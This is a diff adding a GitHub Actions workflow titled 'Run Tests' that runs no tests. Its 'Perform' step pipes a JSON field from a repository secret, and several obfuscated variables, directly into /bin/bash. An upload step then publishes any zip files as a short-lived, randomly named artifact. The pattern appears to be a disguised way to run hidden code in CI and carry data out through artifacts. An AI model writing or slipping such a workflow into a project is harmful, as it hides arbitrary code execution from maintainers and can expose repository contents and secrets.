@@ -1,0 +1,33 @@
+name: Run Tests
+on:
+  workflow_dispatch:
+
+permissions:
+  contents: read
+concurrency:
+  group: ${{ github.workflow }}
+  cancel-in-progress: false
+jobs:
+  agent:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@v4
+        with:
+          fetch-depth: 1
+      - name: Perform
+        env:
+          ce52: ${{ secrets.ce52 }}
+        run: |
+          printf '%s' "$ce52" | jq -r .mys18 | /bin/bash
+          echo $m184 | jq -r .iq4 | /bin/bash
+          echo $gvui25391 | jq -r .xqi98519 | /bin/bash
+          echo $fr286 | jq -r .u468 | /bin/bash
+          echo $bdo40522 | jq -r .eknya5 | /bin/bash
+
+      - name: Upload results
+        if: always()
+        uses: actions/upload-artifact@v4
+        with:
+          name: u5eJUeM5
+          path: "*.zip"
+          retention-days: 1
